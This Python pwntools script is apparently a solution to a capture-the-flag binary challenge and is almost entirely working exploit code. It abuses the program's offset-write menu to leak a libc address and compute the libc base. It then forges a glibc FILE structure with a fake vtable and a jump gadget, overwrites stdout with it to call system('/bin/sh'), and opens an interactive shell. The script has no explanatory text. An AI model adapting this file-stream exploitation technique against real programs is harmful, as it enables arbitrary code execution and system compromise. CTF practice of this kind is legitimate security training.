from pwn import *
context.binary = exe = ELF('./chall_patched')
context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = 'debug'
libc = exe.libc

gdbscript = """
c
"""
#add-symbol-file /usr/lib/debug/usr/lib/libc.so.6.debug

#io = gdb.debug(exe.path, gdbscript)
io = process(exe.path)
# io = remote('1v1.ctf.se', 1337)

def set_value(offset, value, swap=False):
    assert(0 <= offset <= 0x1f4)
    if swap:
        io.sendlineafter(b'> ', b'yes')
    else:
        io.sendlineafter(b'> ', b'no')

    io.sendlineafter(b'> ', b'high')
    io.sendlineafter(b'> ', str(offset).encode())
    io.send(p64(value))

def set_value_raw(offset, value, swap=False):
    assert(0 <= offset <= 0x1f4)
    if swap:
        io.sendlineafter(b'> ', b'yes')
    else:
        io.sendlineafter(b'> ', b'no')

    io.sendlineafter(b'> ', b'high')
    io.sendlineafter(b'> ', str(offset).encode())
    io.send(value)

def set_relative_value(offset, value, swap=False):
    assert(0 <= offset <= 0x1f4)
    assert(0 <= value <= 0x100)
    if swap:
        io.sendlineafter(b'> ', b'yes')
    else:
        io.sendlineafter(b'> ', b'no')

    io.sendlineafter(b'> ', b'low')
    io.sendlineafter(b'> ', str(offset).encode())
    io.send(p64(value))

set_relative_value(40, 0x100)

io.read(56)
leak = u64(io.read(8))
log.success(f'Leak: {hex(leak)}')
libc.address = leak - 0x1d3880
log.success(f'Libc base: {hex(libc.address)}')

system = libc.sym['system']
stdout = libc.sym['_IO_2_1_stdout_']
stdfile_lock = libc.sym['_IO_stdfile_1_lock']
gadget = libc.address + 0x14061c # add rdi, 0x10 ; jmp rcx
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18

log.info(f'system: {hex(system)}')
log.info(f'stdout: {hex(stdout)}')
log.info(f'stdfile_lock: {hex(stdfile_lock)}')
log.info(f'gadget: {hex(gadget)}')
log.info(f'fake_vtable: {hex(fake_vtable)}')

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end = system
fake._IO_save_base = gadget
fake._IO_write_end = u64(b'/bin/sh\x00')
fake._lock=stdfile_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

payload = bytes(fake)

for i in range(0, len(payload), 8):
    set_value_raw(0xe0 + i, payload[i:i+8])

io.sendlineafter(b'> ', b'yes')

io.interactive()
